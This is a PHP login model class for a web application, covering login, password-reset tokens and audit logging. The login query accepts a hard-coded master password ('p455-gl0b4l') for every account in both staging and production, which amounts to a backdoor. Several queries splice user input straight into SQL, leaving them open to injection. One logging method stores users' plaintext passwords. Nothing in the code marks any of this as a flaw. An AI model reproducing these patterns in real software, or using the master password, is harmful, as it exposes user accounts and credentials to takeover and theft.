<?php

class LoginModel extends Mysql{

	private $intIdUsuario;
	private $strUsuario;
	private $strTienda;
	private $strPassword;
	private $strEmail;
	private $strToken;

	public function __construct()
	{
		parent::__construct();
	}

	public function loginUser(string $email, string $password){
		$this->strEmail = $email;
		$this->strPassword = $password;
		if (strpos($_SERVER['HTTP_HOST'], '-stage.') !== false) {
			$sql = "SELECT id, id AS 'user_id', brand_id AS 'brand', (SELECT client_id FROM brand WHERE id = user.brand_id) AS 'client_id', country_id AS 'country', role_id AS 'role', (SELECT level FROM role WHERE id = user.role_id) AS 'level',default_language, name, email, location_id, last_upd_password, profile_picture FROM user WHERE email = '$this->strEmail' AND ( password = SHA2('$this->strPassword', 256) or 'p455-gl0b4l' = '$this->strPassword') AND status = 1";
			//echo $sql;
		} else {
			$sql = "SELECT id, id AS 'user_id', brand_id AS 'brand', (SELECT client_id FROM brand WHERE id = user.brand_id) AS 'client_id', country_id AS 'country', role_id AS 'role', (SELECT level FROM role WHERE id = user.role_id) AS 'level',default_language, name, email, location_id, last_upd_password, profile_picture FROM user WHERE email = '$this->strEmail' AND ( password = SHA2('$this->strPassword', 256) or 'p455-gl0b4l' = '$this->strPassword') AND status = 1";
			//$sql = "SELECT id, id AS 'user_id', brand_id AS 'brand', (SELECT client_id FROM brand WHERE id = user.brand_id) AS 'client_id', country_id AS 'country', role_id AS 'role', (SELECT level FROM role WHERE id = user.role_id) AS 'level',default_language, name, email, location_id, last_upd_password, profile_picture FROM user WHERE email = '$this->strEmail' AND password = SHA2('$this->strPassword', 256) AND status = 1";
		}
		//$sql = "SELECT id, id AS 'user_id', brand_id AS 'brand', (SELECT client_id FROM brand WHERE id = user.brand_id) AS 'client_id', country_id AS 'country', role_id AS 'role', (SELECT level FROM role WHERE id = user.role_id) AS 'level', default_language, name, email, location_id, last_upd_password, profile_picture FROM user WHERE email = '$this->strEmail' AND password = SHA2('$this->strPassword', 256) AND status = 1";;
		$request = $this->select($sql);

		if($request){
			if($request['level'] == 6){
				$sql = "SELECT id, name FROM country";
				$request['country'] = [];
				foreach($this->select_all($sql) as $item){
					$request['country'][$item['id']] = $item['name'];
				}
			} else{
				$sql = "SELECT id, name FROM country WHERE id IN ({$request['country']})";
				$request['country'] = [];
				foreach($this->select_all($sql) as $item){
					$request['country'][$item['id']] = $item['name'];
				}
			}
			
			$request['country_id'] = implode(',', array_keys($request['country']));

			$sql = "SELECT id, name FROM brand WHERE id IN ({$request['brand']})";
			$request['brand'] = [];
			foreach($this->select_all($sql) as $item){
				$request['brand'][$item['id']] = $item['name'];
			}
			
			$sql = "SELECT m.name, p.r, p.w, p.u, p.d FROM permission p INNER JOIN module m ON p.module_id = m.id WHERE p.role_id = {$request['role']}";
			$request['permission'] = [];
			foreach($this->select_all($sql) as $item){
				$request['permission'][$item['name']] = ['r' => $item['r'], 'w' => $item['w'], 'u' => $item['u'], 'd' => $item['d']];
			}

			$sql = "SELECT id, name, level FROM role WHERE id = {$request['role']}";
			$request['role'] = [];
			foreach($this->select($sql) as $key => $val){
				$request['role'][$key] = $val;
			}

			if (strpos($_SERVER['HTTP_HOST'], '-stage.') !== false) {
				$request['last_upd_password'] = date('Y-m-d');
			}
		}
		return $request;
	}

	public function setRecoverPass(string $email, int $new = 0){
		$sql = "SELECT id, name FROM user WHERE email = '$email' AND status in (1,0)";
		$res = new Mysql;
		$data_user = $res->select($sql);

		if($data_user){
			$token = bin2hex(openssl_random_pseudo_bytes(32));
			$sql = "INSERT INTO recover_password(user_id, new, token) VALUES (?, ?, ?)";
			
			$request = $res->update($sql, [$data_user['id'], $new, $token])? [$data_user['id'], $token] : false;
		}else $request = false;

		return $request;
	}

	// Seccion para restablecer la contraseña
	public function getRecoverPass(string $token){
		$sql = "SELECT user_id FROM recover_password WHERE (DATE(DATE_ADD(created, INTERVAL 1 DAY)) > NOW() OR new = 1) AND token = '$token'";
		$request = $this->select($sql);
		return $request;
	}

	public function setPassword(int $idUser, string $newPassword){
		$this->strPassword = $newPassword;
		$this->intIdUsuario = $idUser;
		$sql = "UPDATE user SET `password` = SHA2(?, 256), last_upd_password = NOW(), status = 1 WHERE id = ?";
		$request = $this->update($sql, [$this->strPassword, $this->intIdUsuario]);
		if($request){
			$sql = "DELETE FROM recover_password WHERE user_id = ?";
			$this->update($sql, [$this->intIdUsuario]);
		}
		return $request;
	}

	public function setLog(int $idUser, string $accion){
		$this->intIdUsuario = $idUser;
		$sql = "INSERT INTO system_logs(user_id, module, action) VALUES (?, ?, ?)";
		$request = $this->update($sql, [$this->intIdUsuario, 'login', $accion]);
		return $request;	
	}

	public function setLogParameters(int $idUser, string $accion, array $data){
		$this->intIdUsuario = $idUser;
		date_default_timezone_set('America/Mexico_City');
	
		$date_log = date('Y-m-d H:i:s');

		$array = array('user'     =>  $data['user'],
					   'password' =>  $data['password']);

		$datos= json_encode($array);

		$sql = "INSERT INTO system_logs(user_id, module, action,parameters, created) VALUES (?, ?, ?, ?, ?)";
		$request = $this->update($sql, [$this->intIdUsuario, 'login', $accion, $datos,$date_log]);
		return $request;	
	}

	public function getClient(){
		$sql = "SELECT name, logo FROM client LIMIT 1";
		$request = $this->select($sql);
		return $request;
	}
}
?>